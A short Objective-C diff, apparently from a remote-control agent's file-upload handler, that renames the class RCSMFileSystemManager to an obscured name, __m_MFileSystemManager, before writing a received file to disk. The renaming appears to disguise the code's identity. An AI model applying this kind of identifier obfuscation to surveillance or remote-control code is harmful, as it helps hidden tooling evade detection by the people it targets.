@@ -385,7 +385,7 @@
 #ifdef DEBUG_UP_NOP
           infoLog(@"Received standard file");
 #endif
-          RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+          __m_MFileSystemManager *fsManager = [[__m_MFileSystemManager alloc] init];
           
           [fsManager createFile: filename
                        withData: fileContent];
